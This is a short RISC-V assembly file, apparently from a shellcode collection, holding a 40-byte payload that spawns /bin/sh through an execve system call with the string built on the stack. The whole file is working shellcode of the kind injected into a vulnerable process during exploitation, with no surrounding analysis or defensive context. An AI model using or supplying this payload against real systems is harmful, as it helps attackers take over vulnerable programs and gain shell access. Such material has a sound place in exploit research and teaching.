    # 40 bytes
 
    .include "include.inc"

    .global _start
    .text

_start:
    # execve("/bin/sh", NULL, NULL);
    li     a7, SYS_execve
    mv     a2, x0           # NULL
    mv     a1, x0           # NULL
    li     a3, BINSH        # "/bin/sh"
    sd     a3, (sp)         # stores string on stack
    mv     a0, sp
    ecall
